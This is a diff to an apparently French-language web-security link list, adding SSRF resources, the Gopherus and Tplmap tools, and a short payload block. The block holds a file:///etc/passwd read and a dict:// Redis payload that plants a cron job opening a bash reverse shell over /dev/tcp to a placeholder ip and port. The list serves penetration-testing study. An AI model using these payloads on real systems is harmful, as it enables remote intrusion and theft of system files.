@@ -5,7 +5,9 @@
 - [Beeceptor](https://beeceptor.com/)
 
 - [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
+- [Gopherus](https://github.com/tarunkant/Gopherus)
 - [RSS Validator](https://validator.w3.org/feed/)
+- [Tplmap](https://github.com/epinna/tplmap)
 
 - [Wayback machine ](https://archive.org), https://archive.md/ (web archive par mots clés & copie de sites)
 
@@ -52,6 +54,19 @@ https://excess-xss.com/
 - https://www.next-decision.fr/wiki/differentes-categories-api-majeures-rest-soap-graphql
 - https://www.akilischool.com/cours/laravel-creer-un-flux-rss
 - https://gist.github.com/sl4v/7b5e562f110910f85397
+
+### SSRF
+
+- https://www.vaadata.com/blog/fr/comprendre-la-vulnerabilite-web-server-side-request-forgery-1/
+- https://www.dailysecurity.fr/server-side-request-forgery/
+- https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
+
+```bash
+file://index.php
+file:///etc/passwd
+
+dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/"ip"/"port" 0>\x261\n\n\n"
+```
 
 ## Bypass filters
 
